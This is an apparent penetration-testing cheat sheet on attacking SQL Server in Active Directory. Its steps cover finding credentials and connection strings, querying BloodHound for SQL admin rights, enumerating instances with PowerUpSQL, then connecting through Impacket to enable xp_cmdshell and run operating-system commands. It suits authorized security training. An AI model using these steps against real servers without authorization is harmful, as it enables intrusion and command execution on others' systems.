# SQL Server Admin
It is common to find user and service accounts set up with sysadmin privileges and may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying.
Use the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings :
https://github.com/SnaffCon/Snaffler

With Bloddhound we can use this cypher to check for SQL Admin Rights in the Node Info :
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
## Enumerating MSSQL Instances with PowerUpSQL

```powershell
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```
## use the username you discover to be connected to the server
```powershell
Get-SQLQuery -Verbose -Instance "192.168.0.1,1433" -username "mydomain\username" -password "MYPASSWD" -query 'Select @@version'
```
### we can also use  mssqlclient.py from the Impacket toolkit from a linux machine.
```bash
mssqlclient.py MYDOMAINE/USERNAME@192.168.0.1 -windows-auth
# use help tp see commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
# choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
```
### Enumerating our Rights on the System using xp_cmdshell
```bash
xp_cmdshell whoami /priv
```






